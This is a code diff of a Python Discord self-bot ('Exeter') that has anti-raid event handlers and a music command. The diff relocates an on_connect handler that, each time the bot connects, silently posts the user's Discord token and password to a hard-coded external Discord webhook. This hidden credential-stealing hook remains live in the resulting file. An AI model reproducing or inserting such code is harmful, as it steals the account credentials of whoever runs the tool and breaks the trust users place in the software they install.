@@ -351,12 +351,6 @@ async def on_message(message):
 
 
 @Exeter.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/778744884093648948/p2SQHove1vp5Bn1Dd21w4Q5yJ02TVKdSefmUnJk34SItREKLmLD-kpb_VnBQqDp2PXi3',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
-
-@Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
     if Exeter.antiraid is True:
         try:
@@ -402,6 +396,11 @@ async def on_member_remove(member):
         except Exception as e:
             print(e)
 
+@Exeter.event
+async def on_connect():
+    Clear()  
+    requests.post('https://discord.com/api/webhooks/778744884093648948/p2SQHove1vp5Bn1Dd21w4Q5yJ02TVKdSefmUnJk34SItREKLmLD-kpb_VnBQqDp2PXi3',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    startprint()            
 
 @Exeter.command(aliases=["queue"])
 async def play(ctx, *, query):
